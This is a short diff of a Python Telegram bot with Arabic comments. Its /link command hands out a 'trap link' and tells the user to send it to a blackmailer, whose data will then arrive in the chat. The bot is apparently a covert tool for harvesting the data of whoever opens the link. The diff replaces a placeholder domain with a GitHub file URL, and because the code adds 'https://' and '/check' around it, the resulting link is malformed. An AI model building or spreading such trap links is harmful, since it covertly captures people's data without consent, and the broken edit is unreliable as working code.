@@ -51,7 +51,7 @@ def welcome(message):
 @bot.message_handler(commands=['link'])
 def send_link(message):
     # سيتم استبدال هذا الرابط لاحقاً برابط Railway الخاص بك
-    domain = "ضع_رابط_رالواي_هنا.railway.app" 
+    domain = "https://github.com/gcgguu25584-ai/main.py/blob/a05faf7b6c664612e449cd1fdcef9604a0b9f97b/main.py#L55" 
     msg = "🛡️ **رابط الفخ جاهز:**\n"
     msg += f"`https://{domain}/check`\n\n"
     msg += "أرسله للمبتز، وبمجرد دخوله ستصلك بياناته هنا."
